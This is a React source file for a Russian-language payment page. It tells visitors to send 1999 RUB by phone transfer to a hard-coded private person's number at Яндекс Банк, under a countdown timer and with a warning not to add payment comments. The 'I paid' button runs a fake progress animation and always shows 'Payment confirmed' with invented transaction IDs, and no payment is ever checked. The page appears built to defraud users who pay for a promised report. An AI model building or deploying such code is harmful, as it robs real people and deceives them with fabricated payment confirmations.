import { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Progress } from '@/components/ui/progress';
import { Card, CardContent } from '@/components/ui/card';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import Icon from '@/components/ui/icon';

export default function PaymentPage() {
  const location = useLocation();
  const navigate = useNavigate();
  const { checkValue, checkType, orderNumber } = location.state || {};
  
  const [loading, setLoading] = useState(true);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [paymentReady, setPaymentReady] = useState(false);
  const [timeLeft, setTimeLeft] = useState(600); // 10 minutes
  const [checkingPayment, setCheckingPayment] = useState(false);
  const [checkProgress, setCheckProgress] = useState(0);
  const [paymentConfirmed, setPaymentConfirmed] = useState(false);

  const paymentId = Math.floor(100000000 + Math.random() * 900000000).toString();
  const orderId = 'df' + Math.random().toString(36).substring(2, 8) + '-' + 
                 Math.random().toString(36).substring(2, 6) + '-' +
                 Math.random().toString(36).substring(2, 6) + '-' +
                 Math.random().toString(36).substring(2, 6) + '-' +
                 Math.random().toString(36).substring(2, 14);
  const transactionId = 'TRX' + Date.now() + Math.floor(Math.random() * 10000);

  useEffect(() => {
    if (!orderNumber) {
      navigate('/');
      return;
    }

    // Loading animation
    const loadInterval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) {
          clearInterval(loadInterval);
          setLoading(false);
          setPaymentReady(true);
          return 100;
        }
        return prev + 2;
      });
    }, 200);

    return () => clearInterval(loadInterval);
  }, [orderNumber, navigate]);

  useEffect(() => {
    if (!paymentReady) return;

    const timer = setInterval(() => {
      setTimeLeft(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          navigate('/result', { state: { checkValue, checkType } });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [paymentReady, navigate, checkValue, checkType]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handlePaymentConfirm = () => {
    setCheckingPayment(true);
    
    const interval = setInterval(() => {
      setCheckProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          setPaymentConfirmed(true);
          return 100;
        }
        return prev + 10;
      });
    }, 700);
  };

  const handleGoToShop = () => {
    navigate('/report-delivery', { state: { checkValue, checkType, orderNumber, transactionId } });
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full">
          <Card className="bg-black/50 border-gray-800">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-blue-600 to-blue-700 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                  <Icon name="Search" size={32} className="text-white" />
                </div>
                <h2 className="text-xl font-bold mb-2 text-white">Заказ №{orderId}</h2>
                <p className="text-gray-100 text-sm font-medium">Поиск реквизитов для оплаты</p>
              </div>
              
              <Progress value={loadingProgress} className="h-2 mb-4" />
              
              <div className="flex items-center justify-center gap-2 text-sm text-gray-400">
                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
                <span>Подключение к платежной системе...</span>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  if (paymentConfirmed) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full">
          <Card className="bg-gradient-to-br from-green-900/20 to-black border-green-500/30">
            <CardContent className="p-8 text-center">
              <div className="w-20 h-20 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-6 animate-scale-in">
                <Icon name="CheckCircle" size={48} className="text-white" />
              </div>
              
              <h2 className="text-2xl font-bold mb-3 text-green-300">Платеж подтвержден!</h2>
              <p className="text-gray-100 mb-6 font-medium">Ваш платеж успешно обработан</p>
              
              <div className="bg-black/50 rounded-lg p-4 mb-6 border border-gray-800">
                <div className="grid grid-cols-2 gap-4 text-sm">
                  <div className="text-left">
                    <p className="text-gray-300">Сумма</p>
                    <p className="font-bold text-white">1999.00 RUB</p>
                  </div>
                  <div className="text-right">
                    <p className="text-gray-300">Статус</p>
                    <p className="font-bold text-green-300">Оплачено</p>
                  </div>
                </div>
                <div className="mt-3 pt-3 border-t border-gray-800">
                  <p className="text-gray-300 text-xs font-medium">ID транзакции</p>
                  <p className="font-mono text-xs text-white">{transactionId}</p>
                </div>
              </div>

              <Button 
                onClick={handleGoToShop}
                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 h-12 text-lg"
              >
                Перейти к получению отчета
                <Icon name="ArrowRight" className="ml-2" size={20} />
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  if (checkingPayment) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white flex items-center justify-center p-4">
        <div className="max-w-md w-full">
          <Card className="bg-black/50 border-gray-800">
            <CardContent className="p-8">
              <div className="text-center mb-6">
                <div className="w-16 h-16 bg-gradient-to-br from-blue-600 to-blue-700 rounded-full flex items-center justify-center mx-auto mb-4 animate-pulse">
                  <Icon name="Search" size={32} className="text-white" />
                </div>
                <h2 className="text-xl font-bold mb-2 text-white">Проверка платежа</h2>
                <p className="text-gray-100 text-sm font-medium">Ожидайте подтверждения от банка</p>
              </div>
              
              <Progress value={checkProgress} className="h-2 mb-4" />
              
              <div className="text-center text-sm text-gray-100">
                <p className="font-medium">Проверка может занять до 30 секунд</p>
              </div>
            </CardContent>
          </Card>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-900 via-black to-gray-900 text-white">
      <div className="container mx-auto px-4 py-8 max-w-2xl">
        {/* Header */}
        <div className="text-center mb-6">
          <h1 className="text-2xl font-bold mb-2 text-white">Оплата заказа</h1>
          <p className="text-gray-100 font-medium">Заказ №{orderId}</p>
        </div>

        {/* Timer */}
        <div className="bg-yellow-900/20 border border-yellow-500/30 rounded-lg p-4 mb-6 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <Icon name="Clock" className="text-yellow-500" size={24} />
            <div>
              <p className="font-semibold text-white">Время на оплату</p>
              <p className="text-sm text-gray-100">Платеж будет отменен через:</p>
            </div>
          </div>
          <div className="text-2xl font-mono font-bold text-yellow-400">
            {formatTime(timeLeft)}
          </div>
        </div>

        {/* Payment Details */}
        <Card className="bg-gradient-to-br from-gray-900 to-black border-gray-800 mb-6">
          <CardContent className="p-6">
            <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-4 mb-6 text-center">
              <p className="text-green-300 font-bold mb-2">Реквизиты найдены</p>
              <p className="text-sm text-gray-100 font-medium">Переводите точную сумму, иначе перевод не будет зачислен</p>
            </div>

            <div className="space-y-4">
              <div className="bg-black/50 rounded-lg p-4 border border-gray-800">
                <p className="text-gray-300 text-sm mb-1 font-medium">ID платежа</p>
                <p className="font-mono text-lg text-white">{paymentId}</p>
              </div>

              <div className="bg-black/50 rounded-lg p-4 border border-gray-800">
                <p className="text-gray-100 text-sm mb-3 font-medium">Переведите на указанный номер телефона:</p>
                <div className="space-y-3">
                  <div>
                    <p className="text-xs text-gray-200 mb-1 font-medium">Номер телефона</p>
                    <p className="text-xl font-mono font-bold text-white">+7 981 848 79 57</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-200 mb-1 font-medium">Сумма</p>
                    <p className="text-2xl font-bold text-green-300">1999.00 RUB</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-200 mb-1 font-medium">ФИО получателя</p>
                    <p className="font-semibold text-white">Людмила С.</p>
                  </div>
                  <div>
                    <p className="text-xs text-gray-200 mb-1 font-medium">Банк</p>
                    <p className="font-semibold text-white">Яндекс Банк</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Warnings */}
            <div className="space-y-2 mt-6">
              <div className="flex items-start gap-2 text-sm text-yellow-400">
                <Icon name="AlertTriangle" size={16} className="flex-shrink-0 mt-0.5" />
                <p>Важно! Переводите строго указанную сумму, иначе зачисление не будет произведено.</p>
              </div>
              <div className="flex items-start gap-2 text-sm text-red-400">
                <Icon name="AlertCircle" size={16} className="flex-shrink-0 mt-0.5" />
                <p>Внимание, не указывайте комментарии к платежам.</p>
              </div>
              <div className="flex items-start gap-2 text-sm text-blue-400">
                <Icon name="Info" size={16} className="flex-shrink-0 mt-0.5" />
                <p>После перевода обязательно нажмите кнопку "Я оплатил"</p>
              </div>
            </div>

            {/* Action Button */}
            <Button 
              onClick={handlePaymentConfirm}
              className="w-full mt-6 bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 h-12 text-lg font-bold"
            >
              Я оплатил
            </Button>

            {/* Instructions */}
            <Accordion type="single" collapsible className="mt-6">
              <AccordionItem value="instructions" className="border border-gray-800 rounded-lg px-4">
                <AccordionTrigger className="text-left font-semibold">
                  Инструкция по оплате
                </AccordionTrigger>
                <AccordionContent className="text-sm text-gray-400 space-y-2">
                  <ol className="list-decimal list-inside space-y-2">
                    <li>Дождитесь выдачи реквизитов</li>
                    <li>Скопируйте указанный номер для оплаты</li>
                    <li>Откройте приложение своего банка</li>
                    <li>Выберите "Переводы по номеру телефона (СБП)"</li>
                    <li>Вставьте номер телефона</li>
                    <li>Выберите банк: Яндекс Банк</li>
                    <li>Скопируйте сумму и сделайте перевод: 1999 рублей</li>
                    <li className="text-yellow-400">Переводите точную сумму, в противном случае перевод не будет зачислен</li>
                    <li>После выполненного перевода нажмите кнопку "Я оплатил" для подтверждения платежа в системе</li>
                  </ol>
                </AccordionContent>
              </AccordionItem>
            </Accordion>
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <footer className="bg-black border-t border-gray-800 py-6 mt-12">
        <div className="container mx-auto px-4 text-center text-xs text-gray-500">
          <p>Платежный сервис по приему платежей. © 2025 (Оплата по системе быстрых платежей)</p>
        </div>
      </footer>
    </div>
  );
}